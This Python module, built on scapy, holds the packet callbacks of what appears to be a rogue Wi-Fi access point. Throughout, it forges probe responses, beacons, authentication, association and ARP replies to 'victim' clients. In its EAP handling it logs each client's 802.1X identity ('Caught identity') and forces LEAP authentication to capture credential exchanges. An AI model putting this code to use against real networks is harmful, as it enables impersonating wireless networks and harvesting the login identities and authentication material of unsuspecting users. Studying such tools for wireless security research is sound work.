from .eap import *
from .utility import *
from scapy.layers.dot11 import *
from .constants import *


class Callbacks(object):
    def __init__(self, ap):
        self.ap = ap

        self.cb_dot11_probe_req = self.dot11_probe_resp
        self.cb_dot11_beacon = self.dot11_beacon
        self.cb_dot11_auth = self.dot11_auth
        self.cb_dot11_ack = self.dot11_ack
        self.cb_dot11_assoc_req = self.dot11_assoc_resp
        self.cb_dot11_rts = self.dot11_cts
        self.cb_arp_req = self.arp_resp
        self.cb_dot1X_eap_req = self.dot1x_eap_resp
        self.cb_recv_pkt = self.recv_pkt

    def recv_pkt(self, packet):
        try:
            if Dot11 in packet:
                if len(packet.notdecoded[8:9]) > 0:  # Driver sent radiotap header flags
                    # This means it doesn't drop packets with a bad FCS itself
                    flags = ord(packet.notdecoded[8:9])
                    if flags & 64 != 0:  # BAD_FCS flag is set
                        # Print a warning if we haven't already discovered this MAC
                        if not packet.addr2 is None:
                            debug_print("Dropping corrupt packet from %s" % packet.addr2, 2)
                        # Drop this packet
                        return

                # Management
                if packet.type == 0x00:
                    if packet.subtype == 4:  # Probe request
                        if Dot11Elt in packet:
                            ssid = packet[Dot11Elt].info

                            debug_print("Probe request for SSID %s by MAC %s" % (ssid, packet.addr2), 2)

                            # If in safe mode, we only reply to probe requests with the name of --ap
                            if '1' == '1':
                                if ssid in self.ap.ssids or (Dot11Elt in packet and packet[Dot11Elt].len == 0):
                                    self.ap.add_ssid(ssid)
                                    self.ap.callbacks.cb_dot11_probe_req(packet.addr2, ssid)
                            else:  # Otherwise, spoof any open network
                                if ssid != "":  # Don't spoof the broadcast SSID
                                    self.ap.add_ssid(ssid)
                                    self.ap.callbacks.cb_dot11_probe_req(packet.addr2, ssid)
                    elif packet.subtype == 0x0B:  # Authentication
                        if packet.addr1 == self.ap.mac:  # We are the receivers
                            self.ap.sc = -1  # Reset sequence number
                            self.ap.callbacks.cb_dot11_auth(packet.addr2)
                    elif packet.subtype == 0x00 or packet.subtype == 0x02:  # Association
                        if packet.addr1 == self.ap.mac:  # We are the receivers
                            self.ap.callbacks.cb_dot11_assoc_req(packet.addr2, packet.subtype)
                            self.ap.callbacks.cb_dot1X_eap_req(packet.addr2, EAPCode.REQUEST, EAPType.IDENTITY, None)
                            raw_identity_request = """
     00 00 12 00 2e 48 00 00 00 30 6c 09 c0 00 c2 01
     00 00 08 02 2c 00 cc 08 e0 7b 77 28 00 c0 ca 33
     44 55 00 c0 ca 33 44 55 e0 29 aa aa 03 00 00 00
     88 8e 01 00 00 05 01 01 00 05 01 00 00 00 00 00
     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"""
                            self.unspecified_raw(packet.addr2, hex_offset_to_string(raw_identity_request))  # Raw identity request from wireshark

                # Data packet
                if packet.type == 0x02:
                    if EAPOL in packet:
                        if packet.addr1 == self.ap.mac:
                            # EAPOL Start
                            if packet[EAPOL].type == 1:
                                self.ap.eap_manager.reset_id()
                                self.ap.callbacks.dot1x_eap_resp(packet.addr2, EAPCode.REQUEST, EAPType.IDENTITY, None)
                    if EAP in packet:
                        if packet[EAP].code == EAPCode.RESPONSE:  # Responses
                            if packet[EAP].type == EAPType.IDENTITY:
                                identity = str(packet[Raw])
                                if packet.addr1 == self.ap.mac:
                                    # EAP Identity Response
                                    debug_print("Caught identity: " + identity[0:len(identity) - 4], 1)
                                else:
                                    debug_print("Foreign identity: " + identity[0:len(identity) - 4], 1)

                                # Send auth method LEAP
                                self.ap.callbacks.dot1x_eap_resp(packet.addr2, EAPCode.REQUEST, EAPType.EAP_LEAP, "\x01\x00\x08" + "\x00\x00\x00\x00\x00\x00\x00\x00" + str(identity[0:len(identity) - 4]))
                            if packet[EAP].type == EAPType.NAK:  # NAK
                                method = str(packet[Raw])
                                method = method[0:len(method) - 4]
                                method = ord(method.strip("x\\"))
                                debug_print("NAK suggested methods " + EAPType.convert_type(method), 1)

                    elif ARP in packet:
                        if packet[ARP].pdst == self.ap.ip:
                            self.ap.callbacks.cb_arp_req(packet.addr2, packet[ARP].psrc)
                    """elif DHCP in packet:
                        ap.handleDHCP(packet)"""
        except Exception as err:
            print("Unknown error: %s" % repr(err))

    def dot11_probe_resp(self, source, ssid):
        probe_response_packet = self.ap.get_radiotap_header() \
                                / Dot11(subtype=5, addr1=source, addr2=self.ap.mac, addr3=self.ap.mac, SC=self.ap.next_sc()) \
                                / Dot11ProbeResp(timestamp=self.ap.current_timestamp(), beacon_interval=0x0064, cap=0x2104) \
                                / Dot11Elt(ID='SSID', info=ssid) \
                                / Dot11Elt(ID='Rates', info=AP_RATES) \
                                / Dot11Elt(ID='DSset', info=chr(self.ap.channel))

        # If we are an RSN network, add RSN data to response
        if self.ap.wpa:
            probe_response_packet[Dot11ProbeResp].cap = 0x3101
            rsn_info = Dot11Elt(ID='RSNinfo', info=RSN)
            probe_response_packet = probe_response_packet / rsn_info

        sendp(probe_response_packet, iface=self.ap.interface, verbose=False)

    def dot11_beacon(self, ssid):
        # Create beacon packet
        beacon_packet = self.ap.get_radiotap_header()                                                    \
                     / Dot11(subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=self.ap.mac, addr3=self.ap.mac) \
                     / Dot11Beacon(cap=0x2105)                                                           \
                     / Dot11Elt(ID='SSID', info=ssid)                                                    \
                     / Dot11Elt(ID='Rates', info=AP_RATES)                                               \
                     / Dot11Elt(ID='DSset', info=chr(self.ap.channel))

        if self.ap.wpa:
            beacon_packet[Dot11Beacon].cap = 0x3101
            rsn_info = Dot11Elt(ID='RSNinfo', info=RSN)
            beacon_packet = beacon_packet / rsn_info

        # Update sequence number
        beacon_packet.SC = self.ap.next_sc()

        # Update timestamp
        beacon_packet[Dot11Beacon].timestamp = self.ap.current_timestamp()

        # Send
        sendp(beacon_packet, iface=self.ap.interface, verbose=False)

    def dot11_auth(self, victim):
        auth_packet = self.ap.get_radiotap_header() \
                      / Dot11(subtype=0x0B, addr1=victim, addr2=self.ap.mac, addr3=self.ap.mac, SC=self.ap.next_sc()) \
                      / Dot11Auth(seqnum=0x02)

        debug_print("Sending Authentication (0x0B)...", 2)
        sendp(auth_packet, iface=self.ap.interface, verbose=False)

    def dot11_ack(self, victim):
        ack_packet = self.ap.get_radiotap_header() \
                     / Dot11(type='Control', subtype=0x1D, addr1=victim)

        print("Sending ACK (0x1D) to %s ..." % victim)
        sendp(ack_packet, iface=self.ap.interface, verbose=False)

    def dot11_assoc_resp(self, victim, reassoc):
        response_subtype = 0x01
        if reassoc == 0x02:
            response_subtype = 0x03
        assoc_packet = self.ap.get_radiotap_header() \
                       / Dot11(subtype=response_subtype, addr1=victim, addr2=self.ap.mac, addr3=self.ap.mac, SC=self.ap.next_sc()) \
                       / Dot11AssoResp(cap=0x2104, status=0, AID=self.ap.next_aid()) \
                       / Dot11Elt(ID='Rates', info=AP_RATES)

        debug_print("Sending Association Response (0x01)...", 2)
        sendp(assoc_packet, iface=self.ap.interface, verbose=False)

    def dot11_cts(self, victim):
        cts_packet = self.ap.get_radiotap_header() \
                     / Dot11(ID=0x99, type='Control', subtype=12, addr1=victim, addr2=self.ap.mac, SC=self.ap.next_sc())

        debug_print("Sending CTS (0x0C)...", 2)
        sendp(cts_packet, iface=self.ap.interface, verbose=False)

    def arp_resp(self, victim_mac, victim_ip):
        arp_packet = self.ap.get_radiotap_header() \
                     / Dot11(type="Data", subtype=0, addr1=victim_mac, addr2=self.ap.mac, addr3=self.ap.mac, SC=self.ap.next_sc(), FCfield='from-DS') \
                     / LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) \
                     / SNAP(OUI=0x000000, code=ETH_P_ARP) \
                     / ARP(psrc=self.ap.ip, pdst=victim_ip, op="is-at", hwsrc=self.ap.mac, hwdst=victim_mac)

        debug_print("Sending ARP Response...", 2)
        sendp(arp_packet, iface=self.ap.interface, verbose=False)

    def dot1x_eap_resp(self, victim, eap_code, eap_type, eap_data):
        eap_packet = self.ap.get_radiotap_header() \
                     / Dot11(type="Data", subtype=0, addr1=victim, addr2=self.ap.mac, addr3=self.ap.mac, SC=self.ap.next_sc(), FCfield='from-DS') \
                     / LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) \
                     / SNAP(OUI=0x000000, code=0x888e) \
                     / EAPOL(version=1, type=0) \
                     / EAP(code=eap_code, id=self.ap.eap_manager.next_id(), type=eap_type)

        if not eap_data is None:
            eap_packet = eap_packet / Raw(eap_data)

        debug_print("Sending EAP Packet (code = %d, type = %d, data = %s)..." % (eap_code, eap_type, eap_data), 2)
        sendp(eap_packet, iface=self.ap.interface, verbose=False)

    def unspecified_raw(self, victim, raw_data):
        raw_packet = Raw(raw_data)

        debug_print("Sending RAW packet...", 2)
        sendp(raw_packet, iface=self.ap.interface, verbose=False)